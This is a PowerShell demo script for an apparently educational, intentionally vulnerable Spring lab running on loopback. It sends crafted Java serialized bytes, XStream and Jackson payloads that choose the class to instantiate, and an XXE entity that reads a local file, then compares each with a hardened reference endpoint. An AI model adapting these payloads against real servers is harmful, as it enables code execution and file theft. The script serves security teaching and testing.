$ErrorActionPreference = "Stop"
$ROOT = "C:\Users\uniqo\Downloads\spring-vuln-range\spring-vuln-range"
$PORT = 8086
$BASE = "http://127.0.0.1:${PORT}"

function Write-Title($msg) {
    Write-Host ""
    Write-Host "-------------------------------------------------------------------------------"
    Write-Host "  $msg"
    Write-Host "-------------------------------------------------------------------------------"
}

function Write-Note($msg) {
    Write-Host "  >> $msg"
}

function Invoke-Request($method, $path, $body, $contentType) {
    $url = "${BASE}${path}"
    $params = @{ Uri = $url; Method = $method; UseBasicParsing = $true }
    if ($contentType) { $params["ContentType"] = $contentType }
    if ($body) { $params["Body"] = $body }
    try {
        $response = Invoke-WebRequest @params
        Write-Host "  $method $path"
        Write-Host "    $([string]$response.Content)"
        Write-Host "    <status:$($response.StatusCode)>"
    } catch {
        $status = if ($_.Exception.Response) { $_.Exception.Response.StatusCode.value__ } else { 0 }
        Write-Host "  $method $path"
        Write-Host "    <status:$status>"
    }
}

# Check if service is up
try {
    Invoke-WebRequest -Uri "${BASE}/" -UseBasicParsing -TimeoutSec 3 > $null
} catch {
    Write-Host "Module on port $PORT is not answering."
    Write-Host "Start it with: scripts\run-module.sh m06-deserialization"
    exit 1
}

Write-Host "==============================================================================="
Write-Host " 06 · deserialization, XXE, polymorphic typing (port ${PORT})"
Write-Host "==============================================================================="
Write-Host " target: 127.0.0.1 (loopback) - educational range, intentionally vulnerable"

# Generate attacker payload via Python
$pythonScript = @'
import struct, sys, base64, json

def tc_string(s):
    b = s.encode("utf-8")
    return b"\x74" + struct.pack(">H", len(b)) + b

def tc_class(name, uid):
    return b"\x72" + tc_string(name) + struct.pack(">q", uid) + b"\x01\x00\x00\x78\x70"

note = sys.argv[1]
out = bytearray()
out += b"\xac\xed\x00\x05"           # STREAM_MAGIC, STREAM_VERSION
out += b"\x73"                       # TC_OBJECT (HashMap)
out += tc_class("java.util.HashMap", 362498820763181265)
out += b"\x77\x08"                   # TC_BLOCKDATA, 8 bytes follow
out += struct.pack(">f", 0.75)       # loadFactor
out += struct.pack(">i", 16)         # capacity
out += struct.pack(">i", 1)          # size
out += b"\x73"                       # TC_OBJECT (Probe)
out += tc_class("com.example.vulnrange.m06.vuln.Probe", 1)
out += tc_string(note)                # Probe.note field
out += tc_string("cart")              # map value
out += b"\x78\x78"                   # TC_ENDBLOCKDATA x2

payload_b64 = base64.b64encode(bytes(out)).decode()
payload_json = json.dumps({"base64": payload_b64})
print(payload_json)
'@

$attackerPayload = python3 -c $pythonScript "edited-by-attacker"
Write-Host "  attacker payload size: $($attackerPayload.Length) bytes"

# Title 1
Write-Title "1. Java deserialization of untrusted bytes (CWE-502)"
Write-Note "First, the reference endpoint shows what a legitimately produced stream looks like:"
Invoke-Request "GET" "/vuln6/session/example"
Write-Note "Now submit attacker-crafted bytes whose class list and field values the server never produced:"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/vuln6/session/import" -Method POST -ContentType "application/json" -Body $attackerPayload -UseBasicParsing
    Write-Host "  POST /vuln6/session/import"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /vuln6/session/import"
    Write-Host "    <status:$status>"
}
Write-Note "Side effects - application code that ran because of the payload:"
Invoke-Request "GET" "/vuln6/side-effects"
Write-Note "Reference implementation: ObjectInputFilter allow-list rejects the class before construction."
Write-Host "  POST /safe6/session/import (same bytes)"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/safe6/session/import" -Method POST -ContentType "application/json" -Body $attackerPayload -UseBasicParsing
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "    <status:$status>"
}

# Title 2
Write-Title "2. XStream without type permissions"
Write-Note "The document root names the class to instantiate; NoTypePermission.NONE disables the deny-list."
$xstreamPayload = '<java.util.HashMap><entry><com.example.vulnrange.m06.vuln.Probe><note>xstream-probe</note></com.example.vulnrange.m06.vuln.Probe><string>cart</string></entry></java.util.HashMap>'
try {
    $r = Invoke-WebRequest -Uri "${BASE}/vuln6/xml/xstream" -Method POST -ContentType "application/xml" -Body $xstreamPayload -UseBasicParsing
    Write-Host "  POST /vuln6/xml/xstream"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /vuln6/xml/xstream"
    Write-Host "    <status:$status>"
}
Write-Note "Reference implementation allows exactly one DTO type:"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/safe6/xml/xstream" -Method POST -ContentType "application/xml" -Body $xstreamPayload -UseBasicParsing
    Write-Host "  POST /safe6/xml/xstream"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /safe6/xml/xstream"
    Write-Host "    <status:$status>"
}

# Title 3
Write-Title "3. XXE: read a local file through an external entity"
Write-Note "The marker file path and its existence are reported by the service itself:"
$sideEffects = Invoke-RestMethod -Uri "${BASE}/vuln6/side-effects" -UseBasicParsing
$marker = $sideEffects.markerFile
Write-Host "    $($sideEffects | ConvertTo-Json -Compress)"
Write-Host "  marker file used in the entity: $marker"

$xxeXml = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE declaration [<!ENTITY xxe SYSTEM "file:///' + $marker.Replace('\', '/') + '">]><declaration>&xxe;</declaration>'
Write-Host "  DOCTYPE payload:"
Write-Host "    $xxeXml"
Write-Note "Vulnerable parser resolves the entity and returns file content:"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/vuln6/xml/xxe" -Method POST -ContentType "application/xml" -Body $xxeXml -UseBasicParsing
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "    <status:$status>"
}
Write-Note "Reference parser refuses the DTD outright:"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/safe6/xml/parse" -Method POST -ContentType "application/xml" -Body $xxeXml -UseBasicParsing
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "    <status:$status>"
}
Write-Note "An http:// entity turns the same parser into an outbound request origin (SSRF); the range"
Write-Note "keeps entities pointed at a local file so nothing leaves the machine."

# Title 4
Write-Title "4. Jackson polymorphic typing: the payload chooses the class"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/vuln6/json/polymorphic" -Method POST -ContentType "application/json" -Body '{"@class":"java.util.HashMap","note":"typed-by-payload"}' -UseBasicParsing
    Write-Host "  POST /vuln6/json/polymorphic"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /vuln6/json/polymorphic"
    Write-Host "    <status:$status>"
}
try {
    $r = Invoke-WebRequest -Uri "${BASE}/vuln6/json/polymorphic" -Method POST -ContentType "application/json" -Body '["com.example.vulnrange.m06.vuln.Probe",{"note":"array-form-typing"}]' -UseBasicParsing
    Write-Host "  POST /vuln6/json/polymorphic (array)"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /vuln6/json/polymorphic (array)"
    Write-Host "    <status:$status>"
}
Invoke-Request "GET" "/vuln6/side-effects"
Write-Note "Reference implementation binds to one concrete DTO and rejects unknown properties:"
try {
    $r = Invoke-WebRequest -Uri "${BASE}/safe6/json/data" -Method POST -ContentType "application/json" -Body '{"@class":"com.example.vulnrange.m06.vuln.Probe","subscriptionId":"SUB-1"}' -UseBasicParsing
    Write-Host "  POST /safe6/json/data (with @class)"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /safe6/json/data (with @class)"
    Write-Host "    <status:$status>"
}
try {
    $r = Invoke-WebRequest -Uri "${BASE}/safe6/json/data" -Method POST -ContentType "application/json" -Body '{"subscriptionId":"SUB-1","plan":"ESPD-PRO"}' -UseBasicParsing
    Write-Host "  POST /safe6/json/data (clean)"
    Write-Host "    $([string]$r.Content)"
    Write-Host "    <status:$($r.StatusCode)>"
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  POST /safe6/json/data (clean)"
    Write-Host "    <status:$status>"
}

Write-Host ""
Write-Host "==============================================================================="
Write-Host " done · details and fixes: docs/06-deserialization.md"
Write-Host "==============================================================================="
